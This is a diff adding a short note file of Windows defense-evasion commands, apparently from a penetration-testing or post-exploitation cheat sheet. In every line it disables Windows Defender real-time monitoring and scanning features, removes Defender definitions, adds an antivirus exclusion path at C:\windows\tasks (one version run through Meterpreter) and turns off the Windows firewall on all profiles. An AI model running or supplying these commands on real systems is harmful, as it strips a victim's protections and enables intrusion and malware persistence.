@@ -1,0 +1,9 @@
+/ disable antivirus
+Set-MpPreference -DisableRealtimeMonitoring $true
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
+// add exclude path
+powershell -a "Add-MpPreference -ExclusionPath C:\windows\tasks"
+execute -Hf powershell -a "Add-MpPreference -ExclusionPath C:\windows\tasks" // meterpreter
+
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
